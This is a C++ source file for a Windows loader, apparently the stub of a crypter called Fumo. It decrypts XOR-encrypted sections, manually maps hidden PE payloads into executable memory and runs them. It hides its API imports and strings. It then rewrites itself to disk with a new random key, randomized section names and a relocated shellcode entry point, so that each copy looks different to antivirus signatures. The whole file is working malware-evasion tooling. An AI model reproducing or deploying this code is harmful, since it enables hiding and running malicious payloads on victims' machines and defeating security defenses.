#include <Windows.h>
#include <winternl.h>
#include <lazy_importer.hpp>
#include <xorstr.hpp>
#include <bootstrap.h>
#include <fomo_common.h>

NTSYSAPI ULONG RtlRandomEx(PULONG Seed);

#define DEBUG

#ifdef DEBUG
#define EXIT_WITH_ERROR(error, message) {fnMessageBoxA(nullptr, xorstr_(message), xorstr_("Error"), MB_OK | MB_ICONERROR); fnExitProcess(error);}
#else
#define EXIT_WITH_ERROR(error, message) {fnExitProcess(error);}
#endif

#define ERR_SUCCESS 0
#define ERR_FAILED_TO_ALLOCATE_MEMORY 1
#define ERR_FAILED_TO_FIND_LOADER_SECTION 2
#define ERR_FAILED_TO_FIND_BOOTSTRAP_SECTION 3
#define ERR_FAILED_TO_OPEN_FILE_FOR_NEW_EXECUTABLE 4
#define ERR_FAILED_TO_SET_DELETE_FILE_INFO 5
#define ERR_FAILED_TO_WRITE_NEW_EXECUTABLE_TO_DISK 6
#define ERR_FAILED_TO_WRITE_ENTIRE_NEW_EXECUTABLE_TO_DISK 7
#define ERR_FAILED_TO_MAP_ENCRYPTED_SECTION 8
#define ERR_FAILED_TO_RELOCATE_IMAGE 9
#define ERR_FAILED_TO_FIND_IMPORTED_MODULE 10
#define ERR_FAILED_TO_FIND_IMPORTED_FUNCTION 11
#define ERR_FAILED_TO_EXECUTE_DLL_ENTRY_POINT 12

// simple memcpy that can be inlined
__forceinline void inline_memcpy(PVOID dest, PVOID src, SIZE_T size) {
    for (SIZE_T i = 0; i < size; i++) {
        ((PBYTE)dest)[i] = ((PBYTE)src)[i];
    }
}

__forceinline int map_encrypted_image(ULONG_PTR base, PFUMO_EMBEDDED_DATA embedded_data) {
    auto fnVirtualAlloc = LI_FN(VirtualAlloc).get();
    auto fnExitProcess = LI_FN(ExitProcess).get();
    auto fnLoadLibraryA = LI_FN(LoadLibraryA).get();
    auto fnGetProcAddress = LI_FN(GetProcAddress).get();
#ifdef DEBUG
    // user32.dll is not loaded by default by windows, so we need to load it manually
    LI_FN(LoadLibraryA)(xorstr_("user32.dll"));
    auto fnMessageBoxA = LI_FN(MessageBoxA).get();
#else
    #define fnMessageBoxA(a, b, c, d)
#endif

    auto nt_headers = (PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);

    // allocate memory for section
    auto new_image_base = (ULONG_PTR)fnVirtualAlloc(nullptr, //(LPVOID)nt_headers->OptionalHeader.ImageBase,
        nt_headers->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!new_image_base)
        EXIT_WITH_ERROR(ERR_FAILED_TO_ALLOCATE_MEMORY, "Failed to allocate memory for new executable");

    // map sections
    auto section_header = IMAGE_FIRST_SECTION(nt_headers);
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        auto section = &section_header[i];
        if (section->SizeOfRawData == 0)
            continue;
        auto section_data = (PVOID)(base + section->PointerToRawData);
        inline_memcpy((PVOID)(new_image_base + section->VirtualAddress), section_data, section->SizeOfRawData);
    }

    // process relocations
    auto delta = (ULONG_PTR)new_image_base - nt_headers->OptionalHeader.ImageBase;
    if (delta != 0) {
        auto base_relocation = (PIMAGE_BASE_RELOCATION)(new_image_base + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (base_relocation->VirtualAddress != 0) {
            auto relocation = (PWORD)((ULONG_PTR)base_relocation + sizeof(IMAGE_BASE_RELOCATION));
            auto number_of_relocations = (base_relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            for (auto i = 0; i < number_of_relocations; i++) {
                auto type = relocation[i] >> 12;
                if (type == IMAGE_REL_BASED_DIR64) {
                    auto address = (PULONG_PTR)(new_image_base + base_relocation->VirtualAddress + (relocation[i] & 0xFFF));
                    *address += delta;
                } else if (type != IMAGE_REL_BASED_ABSOLUTE)
                    EXIT_WITH_ERROR(ERR_FAILED_TO_RELOCATE_IMAGE, "Failed to relocate image");
            }
            base_relocation = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)base_relocation + base_relocation->SizeOfBlock);
        }
    }

    // resolve imports
    auto import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(new_image_base + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    while (import_descriptor->Name != 0) {
        auto module_name = (PCHAR)(new_image_base + import_descriptor->Name);
        auto module_handle = fnLoadLibraryA(module_name);
        if (!module_handle)
            EXIT_WITH_ERROR(ERR_FAILED_TO_FIND_IMPORTED_MODULE, "Failed to find imported module");

        auto thunk_data = (PIMAGE_THUNK_DATA)(new_image_base + import_descriptor->FirstThunk);
        while (thunk_data->u1.AddressOfData != 0) {
            if (thunk_data->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                auto function_name = (PCHAR)(thunk_data->u1.Ordinal & 0xFFFF);
                auto function_address = fnGetProcAddress(module_handle, function_name);
                if (!function_address)
                    EXIT_WITH_ERROR(ERR_FAILED_TO_FIND_IMPORTED_FUNCTION, "Failed to find imported function");

                thunk_data->u1.Function = (ULONGLONG)function_address;
            } else {
                auto import_by_name = (PIMAGE_IMPORT_BY_NAME)(new_image_base + thunk_data->u1.AddressOfData);
                auto function_address = fnGetProcAddress(module_handle, import_by_name->Name);
                if (!function_address)
                    EXIT_WITH_ERROR(ERR_FAILED_TO_FIND_IMPORTED_FUNCTION, "Failed to find imported function");

                thunk_data->u1.Function = (ULONGLONG)function_address;
            }
            thunk_data++;
        }
        import_descriptor++;
    }

    // execute dll entry point
    using DllMain = BOOL(WINAPI*)(HINSTANCE, DWORD, PFUMO_EMBEDDED_DATA);
    auto dll_entry_point = (DllMain)(new_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint);
    auto success = dll_entry_point((HINSTANCE)new_image_base, DLL_PROCESS_ATTACH, embedded_data);
    if (!success)
        return ERR_FAILED_TO_EXECUTE_DLL_ENTRY_POINT;
    
    return ERR_SUCCESS;
}

__forceinline int map_encrypted_sections(ULONG_PTR base) {
    auto fnExitProcess = LI_FN(ExitProcess).get();
#ifdef DEBUG
    // user32.dll is not loaded by default by windows, so we need to load it manually
    LI_FN(LoadLibraryA)(xorstr_("user32.dll"));
    auto fnMessageBoxA = LI_FN(MessageBoxA).get();
#else
    #define fnMessageBoxA(a, b, c, d)
#endif

    // parse the headers
    auto nt_headers = (PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
    auto section_header = IMAGE_FIRST_SECTION(nt_headers);

    FUMO_EMBEDDED_DATA embedded_data;
    embedded_data.Data = nullptr;
    embedded_data.Size = 0;

    // map encrypted sections
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        auto section = &section_header[i];
        // only map sections that start with 'e' (encrypted)
        if (section->Name[0] != 'e')
            continue;
        if (section->Misc.VirtualSize < 4)
            EXIT_WITH_ERROR(ERR_FAILED_TO_MAP_ENCRYPTED_SECTION, "Failed to map encrypted section (to small)")
        
        ULONG_PTR section_base = base + section->VirtualAddress;

        // check if this is a data section
        if (*(DWORD*)section_base == FUMO_MAGIC) {
            embedded_data.Data = (PVOID)section_base;
            embedded_data.Size = section->Misc.VirtualSize;
            continue;
        }
        
        auto error = map_encrypted_image(section_base, &embedded_data);
        if (error != ERR_SUCCESS) {
            if (error != ERR_FAILED_TO_EXECUTE_DLL_ENTRY_POINT)
                EXIT_WITH_ERROR(ERR_FAILED_TO_MAP_ENCRYPTED_SECTION, "Failed to map encrypted section");
            return error;
        }
    }
    
    return ERR_SUCCESS;
}

extern "C" void initial_loader(ULONG_PTR xorKey) {
    auto fnGetModuleHandleA = LI_FN(GetModuleHandleA).get();
    auto fnVirtualAlloc = LI_FN(VirtualAlloc).get();
    auto fnVirtualFree = LI_FN(VirtualFree).get();
    auto fnGetTickCount64 = LI_FN(GetTickCount64).get();
    auto fnRtlRandomEx = LI_FN(RtlRandomEx).get();
    auto fnCreateFileA = LI_FN(CreateFileA).get();
    auto fnSetFileInformationByHandle = LI_FN(SetFileInformationByHandle).get();
    auto fnWriteFile = LI_FN(WriteFile).get();
    auto fnCloseHandle = LI_FN(CloseHandle).get();
    auto fnExitProcess = LI_FN(ExitProcess).get();
#ifdef DEBUG
    // user32.dll is not loaded by default by windows, so we need to load it manually
    LI_FN(LoadLibraryA)(xorstr_("user32.dll"));
    auto fnMessageBoxA = LI_FN(MessageBoxA).get();
#else
    #define fnMessageBoxA(a, b, c, d)
#endif

    // get module base
    ULONG_PTR base = (ULONG_PTR)fnGetModuleHandleA(nullptr); // to lazy to pull it from the PEB directly

    // parse the headers
    auto nt_headers = (PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
    auto section_header = IMAGE_FIRST_SECTION(nt_headers);

    // decrypt all sections
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        auto section = &section_header[i];
        // only decrypt sections that start with 'e' (encrypted)
        if (section->Name[0] == 'e') {
            // decrypt section (8 bytes at a time)
            for (int j = 0; j < section->SizeOfRawData; j += sizeof(xorKey)) {
                auto data = (PULONG64)(base + section->VirtualAddress + j);
                *data ^= xorKey;
            }
        }
    }

    // allocate memory for new executable
    auto new_image_base = (ULONG_PTR)fnVirtualAlloc(nullptr, nt_headers->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!new_image_base)
        EXIT_WITH_ERROR(ERR_FAILED_TO_ALLOCATE_MEMORY, "Failed to allocate memory for new executable");

    // copy headers
    inline_memcpy((PVOID)new_image_base, (PVOID)base, nt_headers->OptionalHeader.SizeOfHeaders);
    nt_headers = (PIMAGE_NT_HEADERS)(new_image_base + ((PIMAGE_DOS_HEADER)new_image_base)->e_lfanew);
    section_header = IMAGE_FIRST_SECTION(nt_headers);

    // update image base in new executable to the current base the executable is loaded at
    nt_headers->OptionalHeader.ImageBase = base;

    // unmap sections
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        auto section = &section_header[i];
        if (section->SizeOfRawData == 0) {
            continue;
        }
        inline_memcpy((PVOID)(new_image_base + section->PointerToRawData), (PVOID)(base + section->VirtualAddress), section->SizeOfRawData);
    }

    // generate a new random xor key
    ULONG seed = (ULONG)fnGetTickCount64();
    ULONG_PTR new_xor_key = (ULONG_PTR)fnRtlRandomEx(&seed) | ((ULONG_PTR)fnRtlRandomEx(&seed) << 32);

    // re-encrypt all sections in new executable
    section_header = IMAGE_FIRST_SECTION(nt_headers);
    PIMAGE_SECTION_HEADER loader_section = nullptr;
    PIMAGE_SECTION_HEADER bootstrap_section = nullptr;
    DWORD FileSize = 0;
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        auto section = &section_header[i];
        switch (section->Name[0]) {
        case 'b': // bootstrap
            bootstrap_section = section;
            break;
        case 'l': // loader
            loader_section = section;
            // fallthrough (encrypt loader section too)
        case 'e': // encrypted
            // encrypt section
            for (int j = 0; j < section->SizeOfRawData; j += sizeof(new_xor_key)) {
                auto data = (PULONG64)(new_image_base + section->PointerToRawData + j);
                *data ^= new_xor_key;
            }
            break;
        default:
            // ignore other sections
            break;
        }

        // calculate file size
        FileSize = max(FileSize, section->PointerToRawData + section->SizeOfRawData);
    }

    if (!loader_section)
        EXIT_WITH_ERROR(ERR_FAILED_TO_FIND_LOADER_SECTION, "Failed to find loader section");
    if (!bootstrap_section)
        EXIT_WITH_ERROR(ERR_FAILED_TO_FIND_BOOTSTRAP_SECTION, "Failed to find bootstrap section");

    // fill bootstrap section with random data
    for (int i = 0; i < bootstrap_section->SizeOfRawData; i += sizeof(ULONG)) {
        auto data = (PULONG)(new_image_base + bootstrap_section->PointerToRawData + i);
        *data = fnRtlRandomEx(&seed);
    }

    auto bootstrap_shellcode = get_bootstrap_shellcode(new_xor_key, loader_section->VirtualAddress, loader_section->SizeOfRawData);

    // pick a random offset in the bootstrap section to store the bootstrap shellcode
    ULONG_PTR max_offset = bootstrap_section->SizeOfRawData - bootstrap_shellcode.size();
    ULONG_PTR bootstrap_shellcode_offset = max_offset == 0 ? 0 : (fnRtlRandomEx(&seed) % max_offset);

    // copy bootstrap shellcode to new executable
    inline_memcpy((PVOID)(new_image_base + bootstrap_section->PointerToRawData + bootstrap_shellcode_offset), bootstrap_shellcode.data(), bootstrap_shellcode.size());

    // update entry point to point to bootstrap shellcode
    nt_headers->OptionalHeader.AddressOfEntryPoint = bootstrap_section->VirtualAddress + bootstrap_shellcode_offset;

    // randomize section names
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        auto section = &section_header[i];

        // ignore sections with well known names
        if (section->Name[0] == '.')
            continue;

        // start at 1 to skip our "magic" section type indicator
        for (int j = 1; j < 8; j++) {
            section->Name[j] = (char)(fnRtlRandomEx(&seed) % 26 + 'a');
        }
    }

    // generate a new random file name
    char file_name[MAX_PATH];
    for (int i = 0; i < 16; i++) {
        file_name[i] = (char)(fnRtlRandomEx(&seed) % 26 + 'a');
    }
    file_name[16] = '.';
    file_name[17] = 'e';
    file_name[18] = 'x';
    file_name[19] = 'e';
    file_name[20] = '\0';

    auto file_handle = fnCreateFileA(file_name, GENERIC_WRITE | DELETE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file_handle == INVALID_HANDLE_VALUE)
        EXIT_WITH_ERROR(ERR_FAILED_TO_OPEN_FILE_FOR_NEW_EXECUTABLE, "Failed to open file for new executable");
    
    FILE_DISPOSITION_INFO disposition_info;
    disposition_info.DeleteFile = TRUE;
    if (!fnSetFileInformationByHandle(file_handle, FileDispositionInfo, &disposition_info, sizeof(disposition_info))) {
        fnCloseHandle(file_handle);
        EXIT_WITH_ERROR(ERR_FAILED_TO_SET_DELETE_FILE_INFO, "Failed to set delete file info (1)");
    }

    DWORD bytes_written = 0;
    if (!fnWriteFile(file_handle, (PVOID)new_image_base, FileSize, &bytes_written, nullptr)) {
        fnCloseHandle(file_handle);
        EXIT_WITH_ERROR(ERR_FAILED_TO_WRITE_NEW_EXECUTABLE_TO_DISK, "Failed to write new executable to disk");
    }

    if (bytes_written != FileSize) {
        fnCloseHandle(file_handle);
        EXIT_WITH_ERROR(ERR_FAILED_TO_WRITE_ENTIRE_NEW_EXECUTABLE_TO_DISK, "Failed to write entire new executable to disk");
    }

    fnVirtualFree((PVOID)new_image_base, 0, MEM_RELEASE);

    auto error = map_encrypted_sections(base);
    if (error != ERR_SUCCESS) {
        fnCloseHandle(file_handle);
        fnExitProcess(error);
        return;
    }

    disposition_info.DeleteFileW = FALSE;
    if (!fnSetFileInformationByHandle(file_handle, FileDispositionInfo, &disposition_info, sizeof(disposition_info))) {
        fnCloseHandle(file_handle);
        EXIT_WITH_ERROR(ERR_FAILED_TO_SET_DELETE_FILE_INFO, "Failed to set delete file info (2)");
    }

    fnCloseHandle(file_handle);
    fnExitProcess(0);
}